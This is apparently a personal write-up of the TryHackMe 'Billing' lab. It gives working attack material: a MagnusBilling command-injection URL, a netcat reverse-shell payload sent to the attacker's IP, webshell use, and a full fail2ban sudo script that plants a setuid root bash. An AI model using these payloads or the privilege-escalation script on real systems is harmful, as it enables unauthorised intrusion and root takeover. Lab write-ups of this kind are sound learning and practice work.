# Writeup THM Billing

## Objective
Gain a shell, find the way and escalate your privileges!
Note: Bruteforcing is out of scope for this room.

## Target
10.10.8.249

## Steps Taken
- initial nmap scan got hung up but browsing to the target IP revealed a login panel that has php running in the background.
- The billing profile that is being run is called Magnus. After doing a quick search on exploitdb an exploit was found that seems super simple to exploit affecting version 7.3.0. 
`http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt`
- I confirmed that the URL in the POC was valid by using the following URL
`http://billing.htb/mbilling/lib/icepay/icepay.php?`
- The payload I used to gain a remote shell was as follows:
`http://billing.htb/mbilling/lib/icepay/icepay.php?democ=testfile;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc 10.21.217.147 9443 > /tmp/f;`
- the above failed but the metasploit module was successfull. After gaining access via the msf module I was able to upload a webshell to the server to operate stabilly from.
- Once the webshell was uploaded I was able to esablish a netcat shell and dump the flag.
- Next to escallate privalages I used linpeas.sh to scan the system.
- I noticed that the sudo command was a little out of date but required a password to run, except one file /usr/bin/fail2ban-client which is written in python but is not writeable by the current user.
- The fail2ban version was 1.0.2 and did not have any publically available exploits.
- there is an option to set an action that might be an executable python file using fail2ban, which could be used for priv esc?
`set <JAIL> addaction <ACT>[ <PYTHONFILE> <JSONKWARGS>`
- Nothing fruitful because fail2ban actions are not writeable, but there was an odd binary running as root at `/usr/sbin/asterisk`
- Asterisk is a pbx system and it is running at version 13.35.0 and it is running on ports 5000 and 5060
- Was able to find a sqlite file and exfiltrate it and it contained a variuble /dundi/secret which might be used for something interesting?
- I was poking around in /var/lib/asterisk last
- All of that asterisk stuff is fun and good and all but one of the alternative paths to root is to write a custom fail2ban configuration.
- Once establishing a shell connection again I read through the fail2ban priv esc blog post here:

- I pasted the following into the shell to escallate privalages. How it works is that first it backs up all the fail2ban configurations to the directory located at /tmp/fail2ban. Next it will create a bash script that will be run as part of our custom configuration, the bash script will be run with root privalages and then copy bash to the current directory. The custom configuration custom-start-command.conf is created with the definition defining the action script to be the one located at /tmp/script next a custom jail is added to the end of the jail.local file with the custom-start command configured end enabled set to true. The final step for creating the fail2ban cofnig is to create the my-custom-jail.conf file under the filter.d directory with a [Definition] headding configured. Because bash is technically owned by root and the current directory has chuid privalages the bash binary can be run with `./bash -p` and it will be running as a root. All in all this is very pretty and can be droped into a non-interactive shell.
```
rsync -av /etc/fail2ban/ /tmp/fail2ban/

cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script


cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF

cat >> /tmp/fail2ban/jail.local <<EOF
[my-custom-jail]
enabled = true
action = custom-start-command
EOF

cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
[Definition]
EOF

sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```
- Once executing the new bash binary the root flag was gained.

More can be read about priv esc with fail2ban here: https://juggernaut-sec.com/fail2ban-lpe/

## Cleanup


## Additional Information
